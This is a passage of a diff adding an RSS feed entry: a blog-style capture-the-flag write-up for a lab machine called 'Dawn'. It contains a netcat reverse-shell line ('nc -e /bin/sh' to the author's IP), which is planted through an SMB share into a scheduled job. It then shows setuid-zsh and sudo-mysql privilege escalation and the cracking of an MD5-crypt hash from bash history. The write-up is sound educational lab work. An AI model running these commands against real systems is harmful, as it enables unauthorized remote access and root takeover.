+</span></span><span style="display:flex;"><span>           IPC$            IPC       IPC Service <span style="color:#f92672">(</span>Samba 4.9.5-Debian<span style="color:#f92672">)</span>  
+</span></span><span style="display:flex;"><span>    SMB1 disabled -- no workgroup available
+</span></span></code></pre></div><p>Connecting to the share allows me to upload a file to the folder. I
+begin by creating a file with the following contents named after the
+file I noted begin ran in the logs earilier.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -e /bin/sh 192.168.1.197 <span style="color:#ae81ff">80</span>
+</span></span></code></pre></div><p>If this command is executed, it will create a reverse shell. A reverse
+shell means the victim's computer will reach out to my computer and then
+execute whatever commands I send it. I need to set up a listener on my
+machine. The listener will be the process that waits for the victim to
+connect. After the victim connects to the listener, I can run commands
+on that machine. The program netcat will be used to create a listener on
+my machine. The following command will do so:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo nc -lvnp <span style="color:#ae81ff">80</span>
+</span></span></code></pre></div><p>I am now ready to upload the file. I connect to the share.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>smbclient //192.168.1.165/ITDEPT
+</span></span></code></pre></div><p>Then I upload the file.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>    smb: <span style="color:#ae81ff">\&gt;</span> put product-control
+</span></span></code></pre></div><h1 id="initial-compromise">Initial Compromise</h1>
+<p>I got a response and now have a shell as the user dawn. The initial access has been gained. It is now time to escalate privileges. First, I spawn a tty shell using python.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python -c <span style="color:#e6db74">&#39;import pty; pty.spawn(&#34;/bin/sh&#34;)&#39;</span>
+</span></span></code></pre></div><p>Now I can see what commands this user can run as root. Sudo -l gives
+that information. The output is as follows:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo -l  
+</span></span><span style="display:flex;"><span>Matching Defaults entries <span style="color:#66d9ef">for</span> dawn on dawn:  
+</span></span><span style="display:flex;"><span>   env_reset, mail_badpass,  
+</span></span><span style="display:flex;"><span>   secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin  
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>User dawn may run the following commands on dawn:  
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> NOPASSWD: /usr/bin/mysql  
+</span></span></code></pre></div><p>Dawn can run the MySQL command as root without entering the user's
+password. A useful website called
+<a href="https://gtfobins.github.io/">GTFObins</a> explains how to use these permissions to
+gain a root shell. Unfortunately, I need the password of the root user
+of the MySQL database. Luckily there is hope. The bash history file
+contains a history of commands ran by the user and there is a chance the
+password needed to login into MySQL is there. The relevant parts to the
+history file are included below.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;</span>$1$$<span style="color:#e6db74">bOKpT2ijO.XcGlpjgAup9/&#34;</span>  
+</span></span><span style="display:flex;"><span>sudo -l    
+</span></span><span style="display:flex;"><span>su    
+</span></span><span style="display:flex;"><span>sudo -l    
+</span></span><span style="display:flex;"><span>sudo mysql -u root -p   
+</span></span></code></pre></div><p>The echoed command appears to contain the hashed password needed to log
+into the MySQL database as root. This hash likely could be cracked.
+Since there are multiple paths to root, and cracking the hack would take
+time, I will elect to find an easier way to escalate privileges.</p>
+<p>Another easy way to escalate privileges is to look for binaries that
+have the setuid bit set. The setuid permission allows a user to run the binary as the user who owns the binary. This bit is often set to allow users to use specific binaries with elevated permissions. If the binary allows the user to spawn a shell with root permissions it can become problematic. The find command can be used to look for where binaries are
+stored. The output is included below.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>find / -perm -u<span style="color:#f92672">=</span>s -type f 2&gt;/dev/null  
+</span></span><span style="display:flex;"><span>/usr/sbin/mount.cifs  
+</span></span><span style="display:flex;"><span>/usr/lib/dbus-1.0/dbus-daemon-launch-helper  
+</span></span><span style="display:flex;"><span>/usr/lib/policykit-1/polkit-agent-helper-1  
+</span></span><span style="display:flex;"><span>/usr/lib/eject/dmcrypt-get-device  
+</span></span><span style="display:flex;"><span>/usr/lib/openssh/ssh-keysign  
+</span></span><span style="display:flex;"><span>/usr/bin/su  
+</span></span><span style="display:flex;"><span>/usr/bin/newgrp  
+</span></span><span style="display:flex;"><span>/usr/bin/pkexec  
+</span></span><span style="display:flex;"><span>/usr/bin/passwd  
+</span></span><span style="display:flex;"><span>/usr/bin/sudo  
+</span></span><span style="display:flex;"><span>/usr/bin/mount  
+</span></span><span style="display:flex;"><span>/usr/bin/zsh  
+</span></span><span style="display:flex;"><span>/usr/bin/gpasswd  
+</span></span><span style="display:flex;"><span>/usr/bin/chsh  
+</span></span><span style="display:flex;"><span>/usr/bin/umount  
+</span></span><span style="display:flex;"><span>/usr/bin/chfn
+</span></span></code></pre></div><p>/usr/bin/zsh is the most useful binary. Zsh is a shell program like bash or sh, as a result, using zsh to spawn a shell is rather trivial. I just run the command.</p>
+<h1 id="privilege-escalation">privilege escalation</h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ /usr/bin/zsh   
+</span></span><span style="display:flex;"><span>/usr/bin/zsh    
+</span></span><span style="display:flex;"><span>dawn# <span style="color:#75715e">#                                                                                 </span>
+</span></span><span style="display:flex;"><span>whoami  
+</span></span><span style="display:flex;"><span>root  
+</span></span></code></pre></div><p>I now have root permissions and can read the root flag.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>dawn# cat /root/flag.txt                                                          
+</span></span><span style="display:flex;"><span>cat /root/flag.txt  
+</span></span><span style="display:flex;"><span>Hello! whitecr0wz here. I would like to congratulate and thank you <span style="color:#66d9ef">for</span> finishing the ctf, however, there is another way of getting a shell<span style="color:#f92672">(</span>very similar thou  
+</span></span><span style="display:flex;"><span>gh<span style="color:#f92672">)</span>. Also, <span style="color:#ae81ff">4</span> other methods are available <span style="color:#66d9ef">for</span> rooting this box!  
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>flag<span style="color:#f92672">{[</span>redacted<span style="color:#f92672">]}</span>
+</span></span></code></pre></div><h1 id="alternative-route-cracking-the-hash">Alternative route: cracking the hash</h1>
+<p>I have enough time to investigate an alternative path to root. The
+hashed value in the bash history of the user dawn could be cracked.
+Hashing a password is normally a one-way process that should, in theory,
+prevent the original value from being recovered. In practice, there are
+ways of cracking hashes. The first step in this process is identifying
+which hashing algorithm was used to create this hash.</p>
+<p><a href="https://www.onlinehashcrack.com/hash-identification.php">Online
+websites</a> can be used to identify the hash.
+Alternatively, one could use the Linux
+<a href="https://man7.org/linux/man-pages/man3/crypt.3.html">man-pages</a> for crypt. It states the hash is of the form <code>$_id_$_salt_$_encrypted_</code> where the id number represents the algorithm used. Looking at the table, we can identify our hash <code>$1$$bOKpT2ijO.XcGlpjgAup9/</code>.</p>
+<table>
+<thead>
+<tr>
+<th>ID</th>
+<th>Method</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>MD5</td>
+</tr>
+<tr>
+<td>2a</td>
+<td>Blowfish (not in mainline glibc; added in some Linux distributions)</td>
+</tr>
+<tr>
+<td>5</td>
+<td>SHA-256 (since glibc 2.7)</td>
+</tr>
+<tr>
+<td>6</td>
+<td>SHA-512 (since glibc 2.7)</td>
+</tr>
+</tbody>
+</table>
+
+    <img src="/img/1dawn/pic.png"  alt="hash decrypt website"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Both methods lead to the same conclusion. The hash is an md5 hash.</p>
+<p>It is now time to write a password cracker. I initially wanted to write the password cracker in Go, but I quickly changed my mind. Python seems easier to use. Primary the ability to re-create an existing hash by passing it into the crypt as a <a href="https://stackoverflow.com/questions/53416164/md5-hash-in-python">second
+argument</a> seemed neat.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> crypt<span style="color:#f92672">.</span>crypt(<span style="color:#e6db74">&#39;alice&#39;</span>, <span style="color:#e6db74">&#39;$1$kDHTx$WKRXXT1P7UtjvU7CQ9eWs/&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">1</span><span style="color:#960050;background-color:#1e0010">$</span>kDHTx<span style="color:#960050;background-color:#1e0010">$</span>WKRXXT1P7UtjvU7CQ9eWs<span style="color:#f92672">/</span>
+</span></span></code></pre></div><p>It was time to learn how to get a python script that accepts command
+line arguments. The <a href="https://docs.python.org/3/howto/argparse.html">argsparse</a> library seems to be the recommended
+method of doing so. I stare at the documentation for about an hour and
+struggle to make it work. I quickly learned I needed to escape the $
+symbol in the hash when passing it as an argument. I then realized I
+passed the wrong hash into the program as input. Once those two dumb
+mistakes were fixed everything worked well. I used the rockyou.txt
+wordlist to crack the hash.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python password_hash.py <span style="color:#ae81ff">\$</span>1<span style="color:#ae81ff">\$\$</span>bOKpT2ijO.XcGlpjgAup9/ ../assets/rockyouutf8.txt 
+</span></span><span style="display:flex;"><span>cracked: <span style="color:#f92672">[</span>redacted<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Time:  742.5095741019995
+</span></span></code></pre></div><p>I also used <a href="https://github.com/Nuitka/Nuitka">Nuitka</a> to compile the program to see if it
+ran any faster for fun.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>./password_hash.dist/password_hash <span style="color:#ae81ff">\$</span>1<span style="color:#ae81ff">\$\$</span>bOKpT2ijO.XcGlpjgAup9/ ../assets/rockyouutf8.txt 
+</span></span><span style="display:flex;"><span>cracked: <span style="color:#f92672">[</span>redacted<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Time:  742.5078724539999
+</span></span></code></pre></div><p>The answer is no.</p>
+<h2 id="privilege-escalation-1">privilege escalation</h2>
+<p><a href="https://gtfobins.github.io/gtfobins/mysql/#sudo">GTFObins</a> is consulted once again.
+<code>sudo mysql -e '\! /bin/sh'</code> is the command given to gain a root shell.
+I add in the password cracked earlier.
+<code>sudo mysql -e '\! /bin/sh'-p[redacted]</code>. The alternative path to root
+has been performed. There are two more paths to root, I believe. I will
+leave finding them as an exercise for the reader. This was a lot of fun.
+I hope this write-up was interesting or informative.</p>
+]]></content>
+        </item>
+        
+    </channel>
+</rss>
